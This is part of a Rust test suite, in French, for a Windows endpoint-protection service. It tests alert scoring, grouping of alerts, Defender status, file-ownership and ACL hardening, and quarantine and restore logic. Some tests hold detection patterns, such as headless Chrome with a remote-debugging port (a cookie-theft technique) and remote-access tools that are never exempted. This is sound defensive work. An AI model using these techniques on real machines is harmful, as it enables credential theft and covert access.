        assert!(signal_fort(&alerte("Alerte", "lancé par x", r, 5)), "{r}");
    }
    let mut ids = alerte("Alerte", "IDS : Bureau à distance (RDP) sollicité depuis Internet", "règle 9000041", 6);
    ids.mitre = String::new();
    assert!(signal_fort(&ids));
    // Audit de #121, S121-01 : les actions de réponse ne s'apprennent pas
    for r in ["REP-001", "REP-002", "REP-003", "REP-004"] {
        let mut x = alerte("Alerte", "deR4Tizer", "isolation non vérifiable", 5);
        x.regle = r.into();
        assert!(signal_fort(&x), "{r}");
    }
    let vide = BTreeSet::new();
    assert_eq!(decider("Critique", "x", true, &vide, &[]), None);
    assert!(decider("Alerte", "x", true, &vide, &[]).is_some_and(|d| d.2));
}

#[test]
fn regroupement_second_niveau() {
    let mut lot: Vec<_> = (1..=300).map(|i| {
        let mut a = alerte("Alerte", &format!("{}-liste.example", ["alpha", "beta", "gamma", "delta"][i % 4].repeat(1 + i % 7)), "domaine listé demandé", 6);
        a.processus = "svchost".into();
        a.mitre = "T1071.004".into();
        a
    }).collect();
    let mut vraie = alerte("Critique", "passerelle 192.168.1.254", "USURPATION ARP probable", 12);
    vraie.mitre = "T1557.002".into();
    lot.push(vraie);
    let groupes = crate::notifications::regrouper(&lot);
    assert!(groupes.len() <= 3, "les domaines différents d'une même nature sont fusionnés : {} groupes", groupes.len());
    assert!(crate::notifications::texte(&lot).contains("USURPATION ARP"));
}

/// Phase 1 : mesure du cycle de surveillance (condition préalable au découpage de Moniteur). Répartition par
/// classes de durée, cumul et fenêtre alimentés ensemble, PowerShell comptés par contexte.
#[test]
fn phase1_mesure_du_cycle() {
    use crate::mesure::{duree, instantane, powershell, Stat, SEUILS_MS};
    use std::time::Duration;
    let mut s = Stat::default();
    for ms in [0u64, 1, 3, 7, 40, 90, 400, 900, 4000, 9000] {
        s.ajouter(Duration::from_millis(ms));
    }
    assert_eq!(s.nombre, 10);
    assert_eq!(s.repartition, [2, 1, 1, 1, 1, 1, 1, 1, 1], "classes ≤ {SEUILS_MS:?} ms puis au-delà");
    assert_eq!(s.max_ms, 9000.0);
    assert_eq!(s.dernier_ms, 9000.0);
    assert!((s.total_ms - 14441.0).abs() < 0.5);
    let etape = format!("essai.{}", std::process::id());
    duree(&etape, Duration::from_millis(12));
    duree(&etape, Duration::from_millis(30));
    powershell("essai-mesure");
    let (cumul, fenetre) = instantane();
    for m in [&cumul, &fenetre] {
        let st = m.etapes.get(&etape).expect("étape mesurée");
        assert_eq!((st.nombre, st.repartition[3]), (2, 2), "deux mesures entre 10 et 50 ms");
        assert!(m.powershell.get("essai-mesure").copied().unwrap_or(0) >= 1);
    }
    // Table bornée : au-delà de MAX_ETAPES noms distincts, le reste est compté sous « autre »
    for i in 0..(crate::mesure::MAX_ETAPES + 10) {
        duree(&format!("commande.inconnue{i}"), Duration::from_millis(1));
    }
    let (cumul, _) = instantane();
    assert!(cumul.etapes.len() <= crate::mesure::MAX_ETAPES + 1, "{} étapes", cumul.etapes.len());
    assert!(cumul.etapes.contains_key("autre"));
}

/// Defender au démarrage du PC : constaté, l'interface affichait « DEFENDER DÉSACTIVÉ » pendant les 10 minutes qui
/// suivent un redémarrage (premier relevé « Not running », Defender pas encore prêt). L'état est relu tant qu'aucun
/// état n'a été publié et que Defender ne répond pas ou se dit « Not running » ; ensuite, plus d'attente.
#[test]
fn defender_relu_au_demarrage_avant_publication() {
    use crate::defender::{relire_avant_publication, EtatDefender};
    let pas_pret = EtatDefender { disponible: true, mode: "Not running".into(), ..Default::default() };
    let normal = EtatDefender { disponible: true, antivirus: true, temps_reel: true, mode: "Normal".into(), ..Default::default() };
    let muet = EtatDefender::default();
    assert!(relire_avant_publication(&pas_pret, false), "« Not running » avant tout état publié : relire");
    assert!(relire_avant_publication(&muet, false), "WMI muet avant tout état publié : relire");
    assert!(!relire_avant_publication(&normal, false), "état normal : publié aussitôt");
    assert!(!relire_avant_publication(&pas_pret, true), "après un état publié : une désactivation est vue aussitôt");
    let desactive = EtatDefender { disponible: true, mode: "Normal".into(), temps_reel: false, ..Default::default() };
    assert!(!relire_avant_publication(&desactive, false), "protection en temps réel coupée (mode Normal) : publiée aussitôt");
}

#[test]
fn ip_directe_editeurs_exacts() {
    use crate::moniteur::ip_directe_normale;
    assert!(ip_directe_normale("Proton AG"));
    assert!(ip_directe_normale("Google LLC"));
    assert!(ip_directe_normale("Valve Corp."));
    assert!(!ip_directe_normale("Google Fake Updates Ltd"), "sous-chaîne : refusé");
    assert!(!ip_directe_normale("TeamViewer Germany GmbH"), "prise en main à distance : jamais exemptée");
    assert!(!ip_directe_normale("AnyDesk Software GmbH"));
    assert!(!ip_directe_normale(""));
}

#[test]
fn debogage_a_distance_ancre_sur_l_executable() {
    use crate::processus::suspicion;
    assert!(suspicion(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 --headless"#).is_some());
    assert!(suspicion("chrome.exe --remote-debugging-pipe").is_some());
    assert!(suspicion(r#""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\msedgewebview2.exe" --remote-debugging-port=0"#).is_none());
    assert!(suspicion(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default"#).is_none());
}

// ------------------------------------------------------------ revue v7

#[test]
fn m1_proprietaire_du_dossier_de_donnees() {
    use crate::natif::proprietaire_de_confiance;
    use std::path::Path;
    let programdata = std::env::var("ProgramData").unwrap_or_else(|_| r"C:\ProgramData".into());
    assert_eq!(proprietaire_de_confiance(Path::new(&programdata)), Some(true), "ProgramData appartient à SYSTEM");
    let systeme = crate::natif::dossier_systeme();
    assert_eq!(proprietaire_de_confiance(&Path::new(&systeme).join("kernel32.dll")), Some(false), "TrustedInstaller n'est ni SYSTEM ni Administrateurs");
    assert_eq!(proprietaire_de_confiance(Path::new(r"C:\n-existe-pas\x.json")), None);
    // Hors service (tests, console), pas de contrôle : les fichiers appartiennent à l'utilisateur
    assert!(!crate::natif::est_systeme());
}


// ------------------------------------------------------------ lot 1 : propriété et droits du dossier de données

fn securite(proprietaire: &str, protege: bool, aces: &[(bool, u32, &str)]) -> crate::natif::Securite {
    crate::natif::Securite {
        proprietaire: proprietaire.into(),
        protege,
        aces: aces.iter().map(|&(autorise, masque, sid)| crate::natif::Ace { autorise, masque, sid: sid.into() }).collect(),
        ace_inconnue: false,
    }
}

#[test]
fn lot1_proprietaire_acceptable() {
    use crate::protection::proprietaire_acceptable;
    assert!(proprietaire_acceptable("S-1-5-18"), "SYSTEM");
    assert!(proprietaire_acceptable("S-1-5-32-544"), "Administrateurs");
    for refuse in ["S-1-5-21-1004336348-1177238915-682003330-1001", "S-1-5-32-545", "S-1-5-11", "S-1-1-0",
                   "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464", // TrustedInstaller
                   "", "S-1-5-32-5440", "S-1-5-180", " S-1-5-18", "s-1-5-18"] {
        assert!(!proprietaire_acceptable(refuse), "{refuse:?}");
    }
}

#[test]
fn lot1_droits_conformes() {
    use crate::protection::{droits_conformes, SID_ADMINISTRATEURS as BA, SID_SYSTEME as SY};
    let lecteur = "S-1-5-21-1-2-3-1001";
    let complets = [SY, BA];
    let ok = securite(BA, true, &[(true, 0x1f01ff, SY), (true, 0x1f01ff, BA), (true, 0x1200a9, lecteur)]);
    assert!(droits_conformes(&ok, &complets, &[lecteur]).is_ok());
    // Propriétaire : un compte standard qui a créé le dossier d'avance
    assert!(droits_conformes(&securite(lecteur, true, &[(true, 0x1f01ff, SY)]), &complets, &[]).is_err());
    assert!(droits_conformes(&securite("", true, &[]), &complets, &[]).is_err(), "propriétaire illisible");
    // Héritage de ProgramData encore actif
    assert!(droits_conformes(&securite(BA, false, &[(true, 0x1f01ff, SY)]), &complets, &[]).is_err());
    // Utilisateurs, Utilisateurs authentifiés, Tout le monde, Créateur propriétaire : aucun droit, même en lecture
    for autre in ["S-1-5-32-545", "S-1-5-11", "S-1-1-0", "S-1-3-0"] {
        assert!(droits_conformes(&securite(BA, true, &[(true, 0x1200a9, autre)]), &complets, &[lecteur]).is_err(), "{autre}");
    }
    // Lecteur : lecture seulement ; chaque droit d'écriture isolé est refusé
    for ecriture in [0x2u32, 0x4, 0x10, 0x40, 0x100, 0x1_0000, 0x4_0000, 0x8_0000, 0x0200_0000, 0x1000_0000, 0x4000_0000] {
        let s = securite(BA, true, &[(true, 0x1200a9 | ecriture, lecteur)]);
        assert!(droits_conformes(&s, &complets, &[lecteur]).is_err(), "droit {ecriture:#x}");
    }
    // Dossier de travail de la mise à jour : SYSTEM seul, les administrateurs exclus
    assert!(droits_conformes(&securite(SY, true, &[(true, 0x1f01ff, SY)]), &[SY], &[]).is_ok());
    assert!(droits_conformes(&securite(SY, true, &[(true, 0x1f01ff, SY), (true, 0x1f01ff, BA)]), &[SY], &[]).is_err());
    // Un refus explicite ne gêne pas ; une entrée d'un type inconnu, si
    assert!(droits_conformes(&securite(BA, true, &[(false, 0x1f01ff, "S-1-5-32-545"), (true, 0x1f01ff, SY)]), &complets, &[]).is_ok());
    let mut inconnue = securite(BA, true, &[(true, 0x1f01ff, SY)]);
    inconnue.ace_inconnue = true;
    assert!(droits_conformes(&inconnue, &complets, &[]).is_err());
}

#[test]
fn lot1_lecture_echec_ferme() {
    use crate::commun::lecture_autorisee;
    // Hors service : pas de contrôle (tests, mode console)
    assert!(lecture_autorisee(false, true, true, true, Some(false)).is_ok());
    // En service
    assert!(lecture_autorisee(true, true, false, true, Some(true)).is_ok());
    assert!(lecture_autorisee(true, true, false, false, None).is_ok(), "fichier absent : la lecture échoue d'elle-même");
    assert!(lecture_autorisee(true, true, false, true, None).is_err(), "fichier présent au propriétaire illisible (DACL vide)");
    assert!(lecture_autorisee(true, true, false, true, Some(false)).is_err(), "propriétaire : compte standard");
    assert!(lecture_autorisee(true, true, true, true, Some(true)).is_err(), "protection non vérifiée : rien n'est chargé");
    // lecteurs.json (sans le verrou) : seul le propriétaire compte
    assert!(lecture_autorisee(true, false, true, true, Some(true)).is_ok());
    assert!(lecture_autorisee(true, false, true, true, Some(false)).is_err());
    assert!(lecture_autorisee(true, false, true, true, None).is_err());
}

#[test]
fn lot1_tri_au_demarrage_proprietaire_non_verifie_ecarte() {
    use crate::protection::{trier_element, Tri};
    assert_eq!(trier_element(false, Some(true)), Tri::Garder);
    assert_eq!(trier_element(false, Some(false)), Tri::Ecarter, "compte standard");
    // Revue de la PR 1 : un compte standard pose une DACL vide sur son fichier, SYSTEM ne lit plus le
    // propriétaire ; garder le fichier le ferait blanchir par la prise de possession qui suit
    assert_eq!(trier_element(false, None), Tri::Ecarter, "propriétaire illisible");
    for p in [Some(true), Some(false), None] {
        assert_eq!(trier_element(true, p), Tri::SupprimerLien, "un lien est supprimé quel que soit son propriétaire");
    }
}

#[test]
fn lot1_echec_du_demarrage_non_leve_par_la_verification_horaire() {
    use crate::protection::combiner;
    // Constaté sur le poste : un dossier piégé impossible à écarter mettait la protection en échec, puis la
    // première vérification horaire (racine seule, conforme) levait l'échec dans la même seconde
    let e = Some("un élément d'un autre propriétaire n'a pas pu être écarté".to_string());
    assert!(combiner(e.clone(), Ok(())).is_err());
    assert!(combiner(e, Err("autre".into())).is_err());
    assert!(combiner(None, Ok(())).is_ok());
    assert!(combiner(None, Err("droits de la racine".into())).is_err());
}

#[test]
fn lot1_dacl_vide_proprietaire_illisible() {
    // Ce que voit le service sur un fichier à DACL vide dont il n'est pas propriétaire : lecture des droits
    // impossible. Hors élévation, le propriétaire (le compte du test) garde READ_CONTROL : on vérifie au moins
    // que la DACL vide est bien posée et que la décision ne s'appuie pas sur un None.
    use crate::natif::{lire_securite, poser_droits};
    let d = std::env::temp_dir().join(format!("der4tizer-dacl-vide-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    let f = d.join("config.json");
    std::fs::write(&f, b"{}").unwrap();
    let proprietaire = lire_securite(&f).unwrap().proprietaire;
    poser_droits(&f, &format!("O:{proprietaire}D:P")).unwrap();
    if let Some(s) = lire_securite(&f) {
        assert!(s.protege && s.aces.is_empty(), "DACL vide : {:?}", s.aces);
    }
    assert!(std::fs::read(&f).is_err(), "plus personne ne lit le contenu");
    // Remise des droits pour nettoyer : le propriétaire garde le droit de réécrire la DACL (pas de changer
    // le propriétaire, d'où icacls et non poser_droits)
    assert!(crate::protection::icacls(&[&f.to_string_lossy(), "/grant", &format!("*{proprietaire}:F")]));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1_fichier_cree_avec_ses_droits_et_dacl_remplacee() {
    use crate::natif::{ecrire_fichier_protege, lire_securite, poser_droits};
    let d = std::env::temp_dir().join(format!("der4tizer-lot1-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    // Le test tourne sans élévation : le compte du test garde ses droits (le service, lui, est SYSTEM)
    let utilisateur = lire_securite(&d).unwrap().proprietaire;
    assert!(utilisateur.starts_with("S-1-5-"), "{utilisateur}");
    let sddl = format!("D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;{utilisateur})");
    // Fichier créé directement avec une DACL protégée, rien d'hérité du dossier
    let f = d.join("jeton.txt");
    ecrire_fichier_protege(&f, b"abc", &sddl).unwrap();
    let s = lire_securite(&f).expect("droits lisibles");
    assert!(s.protege);
    // Comptes distincts : en CI, le test tourne en administrateur élevé et le compte du test est alors
    // Administrateurs lui-même (Windows fusionne les deux entrées)
    let sids: std::collections::BTreeSet<_> = s.aces.iter().filter(|a| a.autorise).map(|a| a.sid.clone()).collect();
    let attendu: std::collections::BTreeSet<_> = ["S-1-5-18".to_string(), "S-1-5-32-544".into(), utilisateur.clone()].into();
    assert_eq!(sids, attendu);
    // Remplacement d'un fichier existant : toujours protégé, contenu remplacé
    ecrire_fichier_protege(&f, b"defg", &sddl).unwrap();
    assert!(lire_securite(&f).unwrap().protege);
    assert_eq!(std::fs::read(&f).unwrap(), b"defg");
    // poser_droits remplace TOUTE la DACL : une entrée « Utilisateurs : modification » ne survit pas
    assert!(crate::protection::icacls(&[&d.to_string_lossy(), "/grant", "*S-1-5-32-545:(OI)(CI)M"]));
    assert!(lire_securite(&d).unwrap().aces.iter().any(|a| a.sid == "S-1-5-32-545"));
    poser_droits(&d, &format!("O:{utilisateur}D:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;{utilisateur})")).unwrap();
    let s = lire_securite(&d).unwrap();
    assert!(s.protege && !s.ace_inconnue);
    assert!(!s.aces.iter().any(|a| a.sid == "S-1-5-32-545"), "entrée étrangère retirée : {:?}", s.aces);
    assert!(poser_droits(&d, "D:P(A;;FA;;;SY").is_err(), "SDDL invalide : erreur, rien de posé");
    let _ = std::fs::remove_dir_all(&d);
}

// ------------------------------------------------------------ lot 1, seconde relecture de la PR 1

#[test]
fn lot1_mise_de_cote_ratee_jamais_de_confiance() {
    // Relecture : un fichier piégé tenu ouvert sans partage de suppression pendant le démarrage ne doit pas
    // changer de propriétaire, sinon il serait gardé (et chargé) au démarrage suivant
    use crate::natif::{lire_securite, renommer_par_handle};
    use crate::protection::{trier_element, Tri};
    use std::os::windows::fs::OpenOptionsExt;
    let d = std::env::temp_dir().join(format!("der4tizer-tenu-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(d.join("ecartes")).unwrap();
    let f = d.join("lecteurs.json");
    std::fs::write(&f, b"[]").unwrap();
    let avant = lire_securite(&f).unwrap();
    {
        // Ouvert en lecture, partage en lecture seule : ni écriture ni suppression partagées
        let _tenu = std::fs::OpenOptions::new().read(true).share_mode(0x1).open(&f).unwrap();
        assert!(renommer_par_handle(&f, &d.join("ecartes").join("x-lecteurs.json")).is_err(), "fichier tenu : déplacement impossible");
        let apres = lire_securite(&f).unwrap();
        assert_eq!(apres.proprietaire, avant.proprietaire, "aucune prise de possession");
        assert_eq!(apres.aces, avant.aces, "droits inchangés");
    }
    // Propriétaire inchangé, donc toujours non vérifié pour le service : écarté au démarrage suivant
    for p in [Some(false), None] {
        assert_eq!(trier_element(false, p), Tri::Ecarter);
    }
    // Une fois relâché, le déplacement par handle réussit, sans changer propriétaire ni droits
    let dest = d.join("ecartes").join("x-lecteurs.json");
    renommer_par_handle(&f, &dest).unwrap();
    assert!(!f.exists() && dest.exists());
    assert_eq!(lire_securite(&dest).unwrap().proprietaire, avant.proprietaire);
    // Un dossier se déplace aussi
    std::fs::create_dir_all(d.join("piege")).unwrap();
    renommer_par_handle(&d.join("piege"), &d.join("ecartes").join("x-piege")).unwrap();
    assert!(d.join("ecartes").join("x-piege").is_dir());
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1_privilege_de_restauration_limite_a_l_appel() {
    use crate::natif::avec_privilege_restauration;
    // Hors élévation, le privilège n'est pas dans le jeton : refus, et f n'est pas exécutée. En CI (élevé),
    // il est accordé le temps de l'appel. Dans les deux cas, le fil revient à son jeton.
    let mut appele = false;
    match avec_privilege_restauration(|| appele = true) {
        Ok(()) => assert!(appele),
        Err(e) => {
            assert!(!appele, "f ne doit pas s'exécuter sans le privilège");
            assert!(e.contains("privilège") || e.contains("jeton"), "{e}");
        }
    }
    // Rappel immédiat : pas d'emprunt de jeton resté actif (un second ImpersonateSelf réussit pareil)
    let r2 = avec_privilege_restauration(|| 1);
    assert_eq!(r2.is_ok(), appele);
}

/// Lot 5 : après un emprunt d'identité ou un privilège activé sur le fil, un retour à l'identité du service
/// impossible (RevertToSelf en échec) arrête le service, dans les deux fonctions qui empruntent
#[test]
fn lot5_retour_a_soi_impossible_arret() {
    use crate::natif::retour_ou_arret;
    let mut arrete = false;
    retour_ou_arret(Err("refusé".to_string()), "essai", |_| arrete = true);
    assert!(arrete, "échec du retour : arrêt");
    let mut arrete = false;
    retour_ou_arret(Ok(()), "essai", |_| arrete = true);
    assert!(!arrete, "retour réussi : pas d'arrêt");
    let natif = include_str!("natif.rs");
    assert!(!natif.contains("let _ = RevertToSelf()"), "un échec de RevertToSelf est ignoré quelque part");
}

/// Lot 5 : en échec de la protection du dossier, aucune réponse automatique alimentée par les fichiers du dossier
/// (listes de menaces, règles IDS) : ni blocage automatique, ni IPS ; hors échec, rien ne change
#[test]
fn lot5_reponses_automatiques_jamais_en_echec_ferme() {
    use crate::ids::blocage_ips;
    use crate::tests::blocage_automatique;
    let niveau3 = crate::menaces::Correspondance { source: "essai".into(), haute: true, auto: true };
    let autre = crate::menaces::Correspondance { source: "essai".into(), haute: true, auto: false };
    assert!(blocage_automatique(&niveau3, true, false, false));
    assert!(!blocage_automatique(&niveau3, true, false, true), "échec fermé : pas de blocage automatique");
    assert!(!blocage_automatique(&autre, true, false, false), "confiance haute, source hors du niveau 3");
    assert!(!blocage_automatique(&niveau3, false, false, false), "réglage désactivé");
    assert!(!blocage_automatique(&niveau3, true, true, false), "déjà bloquée");
    assert!(blocage_ips(true, true, "drop", 3, true, false));
    assert!(blocage_ips(true, true, "alert", 1, true, false), "priorité 1");
    assert!(!blocage_ips(true, true, "drop", 3, true, true), "échec fermé : pas de blocage IPS");
    assert!(!blocage_ips(false, true, "drop", 3, true, false), "IPS désactivé");
    assert!(!blocage_ips(true, false, "drop", 3, true, false), "adresse non publique");
    assert!(!blocage_ips(true, true, "alert", 2, true, false), "ni drop, ni reject, ni priorité 1");
    assert!(!blocage_ips(true, true, "drop", 3, false, false), "connexion non établie (source usurpable)");
}

/// Lot 5 : les fichiers du dossier de données que le service télécharge lui-même (listes de menaces, règles IDS,
/// LOLDrivers, JA3) et les événements du SIEM sont lus par commun (propriétaire contrôlé), jamais directement
#[test]
fn lot5_lectures_du_dossier_par_commun() {
    for (module, source) in [("menaces.rs", include_str!("menaces.rs")), ("ids.rs", include_str!("ids.rs")),
                             ("dpi.rs", include_str!("dpi.rs")), ("siem.rs", include_str!("siem.rs"))] {
        for interdit in ["fs::read_to_string(", "fs::File::open(", "fs::read("] {
            assert!(!source.contains(interdit), "{module} lit directement ({interdit})");
        }
    }
    let hygiene = include_str!("hygiene.rs");
    let loldrivers = &hygiene[hygiene.find("loldrivers.json").expect("loldrivers.json")..];
    // Fin de la fonction (« \n} » : valable avec des fins de ligne LF comme CRLF)
    let fonction = &loldrivers[..loldrivers.find("\n}").unwrap_or(loldrivers.len())];
    assert!(!fonction.contains("fs::read_to_string("), "hygiene.rs lit loldrivers.json directement");
}

#[test]
fn lot1_lisible_en_echec_liste_d_autorisation() {
    use crate::commun::lisible_en_echec;
    for oui in ["geoip\\afrinic.txt", "GeoIP/ripencc.txt", "alertes.json", "incidents.json", "journal.txt"] {
        assert!(lisible_en_echec(oui), "{oui}");
    }
    for non in ["config.json", "lecteurs.json", "apprentissage.json", "blocages.json", "quarantaine.json",
                "secrets\\notifications.json", "secrets\\leurres-noms.json", "api-jeton.txt", "baseline-sauvegarde.json",
                "executables.json", "extensions-connues.json", "ecoutes-connues.json", "peripheriques-connus.json",
                "geoip\\sous\\x.txt", "geoip\\", "geoip\\x.json", "..\\config.json", "", "alertes.json\\x",
                // Lot 5 : le cache DNS n'est plus lu en échec fermé
                "dns.json"] {
        assert!(!lisible_en_echec(non), "{non}");
    }
}

#[test]
fn lot1_alerte_critique_locale_en_echec() {
    let a = crate::protection::alerte_echec("un élément d'un autre propriétaire n'a pas pu être écarté");
    assert_eq!(a.niveau, "Critique");
    assert!(a.raisons.contains("n'a pas pu être écarté") && a.raisons.contains("pas remontée"));
    assert!(!a.raisons.contains("  "), "texte sans espaces doublés : {}", a.raisons);
}

// ------------------------------------------------------------ lot 1 bis : quarantaine et mise à l'écart sans perte

fn dossier_test(nom: &str) -> std::path::PathBuf {
    let d = std::env::temp_dir().join(format!("der4tizer-{nom}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

/// SID du compte du test (propriétaire de ce qu'il crée) et SDDL de quarantaine pour le test : même forme que
/// celle du service, avec le compte du test à la place de SYSTEM (hors élévation, on ne peut pas donner un
/// fichier à SYSTEM)
fn sddl_test(d: &std::path::Path) -> (String, String) {
    let moi = crate::natif::lire_securite(d).unwrap().proprietaire;
    (moi.clone(), format!("O:{moi}D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;{moi})"))
}

/// Écriture du manifeste pour les tests : vers un fichier, en échouant à l'appel numéro `echec` (0 : jamais)
struct Manifeste {
    fichier: std::path::PathBuf,
    appels: std::cell::Cell<u32>,
    echec: u32,
}

impl Manifeste {
    fn new(d: &std::path::Path, echec: u32) -> Self {
        Manifeste { fichier: d.join("quarantaine.json"), appels: std::cell::Cell::new(0), echec }
    }
    fn ecrire(&self, l: &[crate::reponse::ElementQuarantaine]) -> Result<(), String> {
        self.appels.set(self.appels.get() + 1);
        if self.appels.get() == self.echec {
            return Err("disque plein (simulé)".into());
        }
        crate::commun::ecrire_dans(&self.fichier, l)
    }
    fn lu(&self) -> Vec<crate::reponse::ElementQuarantaine> {
        serde_json::from_slice(&std::fs::read(&self.fichier).unwrap_or_default()).unwrap_or_default()
    }
}

#[test]
fn lot1bis_quarantaine_redemarrage_restauration() {
    use crate::protection::{trier_element, Tri};
    use crate::reponse::{quarantaine_transaction, EtatQuarantaine, SDDL_QUARANTAINE};
    let d = dossier_test("quarantaine");
    let (moi, sddl) = sddl_test(&d);
    let dq = d.join("quarantaine");
    let origine = d.join("Téléchargements").join("faux-positif.exe");
    std::fs::create_dir_all(origine.parent().unwrap()).unwrap();
    let contenu: Vec<u8> = (0..200_000u32).map(|i| (i * 7 % 251) as u8).collect();
    std::fs::write(&origine, &contenu).unwrap();
    let m = Manifeste::new(&d, 0);
    let mut liste = Vec::new();
    quarantaine_transaction(&dq, &mut liste, &origine, "id1", "test", &sddl, &|l| m.ecrire(l)).unwrap();
    assert!(!origine.exists(), "original retiré");
    assert_eq!(liste[0].etat(), EtatQuarantaine::Terminee);
    assert_eq!(m.lu(), liste, "manifeste enregistré");
    let copie = dq.join(liste[0].nom_fichier().unwrap());
    // Copie créée par le service avec ses droits : propriétaire celui du SDDL (en service, SYSTEM)
    let s = crate::natif::lire_securite(&copie).unwrap();
    assert_eq!(s.proprietaire, moi);
    assert!(s.protege);
    assert!(SDDL_QUARANTAINE.starts_with("O:SY"), "en service, propriétaire SYSTEM");
    // Redémarrage : une copie à SYSTEM est gardée par le tri
    assert_eq!(trier_element(false, Some(true)), Tri::Garder);
    // Copie modifiée : refus
    let mut altere = contenu.clone();
    altere[10] ^= 1;
    std::fs::write(&copie, &altere).unwrap();
    assert!(restaurer_test(&dq, &mut liste, "id1", &|l| m.ecrire(l)).unwrap_err().contains("modifiée"));
    std::fs::write(&copie, &contenu).unwrap();
    // Emplacement d'origine occupé : refus, rien d'écrasé
    std::fs::write(&origine, b"autre").unwrap();
    assert!(restaurer_test(&dq, &mut liste, "id1", &|l| m.ecrire(l)).is_err());
    assert_eq!(std::fs::read(&origine).unwrap(), b"autre");
    std::fs::remove_file(&origine).unwrap();
    // Restauration : même contenu, copie et entrée retirées
    restaurer_test(&dq, &mut liste, "id1", &|l| m.ecrire(l)).unwrap();
    assert_eq!(std::fs::read(&origine).unwrap(), contenu);
    assert!(!copie.exists() && liste.is_empty() && m.lu().is_empty());
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1bis_marque_internet_conservee() {
    use crate::reponse::{lire_marque_internet, migrer_quarantaine, quarantaine_transaction, ElementQuarantaine};
    let d = dossier_test("marque");
    let (_, sddl) = sddl_test(&d);
    let dq = d.join("quarantaine");
    let marque = "[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://exemple.invalid/setup.exe\r\n";
    let m = Manifeste::new(&d, 0);
    // Quarantaine puis restauration
    let f = d.join("setup.exe");
    std::fs::write(&f, b"MZ...").unwrap();
    std::fs::write(format!("{}:Zone.Identifier", f.display()), marque).unwrap();
    let mut liste = Vec::new();
    quarantaine_transaction(&dq, &mut liste, &f, "z1", "test", &sddl, &|l| m.ecrire(l)).unwrap();
    assert!(liste[0].zone_identifier.contains("ZoneId=3"));
    restaurer_test(&dq, &mut liste, "z1", &|l| m.ecrire(l)).unwrap();
    assert!(lire_marque_internet(&f).contains("ZoneId=3"), "marque réécrite sur le fichier restauré");
    // Migration d'une ancienne copie (déplacée avec son flux), puis restauration
    std::fs::write(dq.join("ancien.quarantaine"), b"MZ ancien").unwrap();
    std::fs::write(format!("{}:Zone.Identifier", dq.join("ancien.quarantaine").display()), marque).unwrap();
    let g = d.join("ancien.exe");
    let mut liste = vec![ElementQuarantaine { id: "ancien".into(), chemin_origine: g.display().to_string(), ..Default::default() }];
    migrer_quarantaine(&dq, &mut liste, &sddl, |_| Some(false), &|l| m.ecrire(l));
    assert!(liste[0].zone_identifier.contains("ZoneId=3"));
    restaurer_test(&dq, &mut liste, "ancien", &|l| m.ecrire(l)).unwrap();
    assert!(lire_marque_internet(&g).contains("ZoneId=3"));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1bis_ancien_fichier_quarantaine_migre_sans_perte() {
    use crate::reponse::{migrer_quarantaine, ElementQuarantaine};
    let d = dossier_test("migration");
    let (_, sddl) = sddl_test(&d);
    let dq = d.join("quarantaine");
    std::fs::create_dir_all(&dq).unwrap();
    // Avant la 4.3 : déplacé tel quel (propriétaire de l'utilisateur), sans empreinte, nom « <id>.quarantaine »
    std::fs::write(dq.join("ancien.quarantaine"), b"contenu d'origine").unwrap();
    std::fs::write(dq.join("confiance.quarantaine"), b"deja sur").unwrap();
    let origine = d.join("restaure.exe");
    let mut liste = vec![
        ElementQuarantaine { id: "ancien".into(), chemin_origine: origine.display().to_string(), ..Default::default() },
        ElementQuarantaine { id: "confiance".into(), chemin_origine: d.join("x").display().to_string(), ..Default::default() },
        ElementQuarantaine { id: "disparu".into(), chemin_origine: d.join("y").display().to_string(), ..Default::default() },
    ];
    let m = Manifeste::new(&d, 0);
    let messages = migrer_quarantaine(&dq, &mut liste, &sddl, |p| Some(p.ends_with("confiance.quarantaine")), &|l| m.ecrire(l));
    assert_eq!(messages.len(), 2, "{messages:?}");
    assert!(liste[0].fichier.starts_with("ancien-") && liste[0].sha256.len() == 64);
    assert!(!dq.join("ancien.quarantaine").exists());
    // Copies en clair réencodées, propriétaire de confiance ou non : plus rien du contenu en clair
    for e in &liste[..2] {
        let c = dq.join(&e.fichier);
        assert!(crate::reponse::est_encodee(&c), "{}", e.fichier);
        assert!(!contient(&std::fs::read(&c).unwrap(), b"contenu") && !contient(&std::fs::read(&c).unwrap(), b"deja sur"));
    }
    assert!(liste[1].fichier.starts_with("confiance-") && liste[1].sha256.len() == 64);
    assert!(liste[2].sha256.is_empty());
    assert_eq!(m.lu(), liste, "nouvelle copie enregistrée");
    restaurer_test(&dq, &mut liste, "ancien", &|l| m.ecrire(l)).unwrap();
    assert_eq!(std::fs::read(&origine).unwrap(), b"contenu d'origine");
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1bis_decision_de_reprise() {
    use crate::reponse::{decision_reprise, EtatQuarantaine::*, Original::*, Reprise};
    // (état, original, copie présente) : toutes les combinaisons
    assert_eq!(decision_reprise(EnCours, Identique, true), Reprise::RetirerCopieEtEntree);
    assert_eq!(decision_reprise(EnCours, Different, true), Reprise::MarquerTerminee, "un autre fichier au même chemin : copie gardée");
    assert_eq!(decision_reprise(EnCours, Absent, true), Reprise::MarquerTerminee);
    assert_eq!(decision_reprise(EnCours, Identique, false), Reprise::RetirerEntree);
    assert_eq!(decision_reprise(EnCours, Different, false), Reprise::RetirerEntree);
    assert!(matches!(decision_reprise(EnCours, Absent, false), Reprise::Signaler(_)));
    for o in [Identique, Different, Absent] {
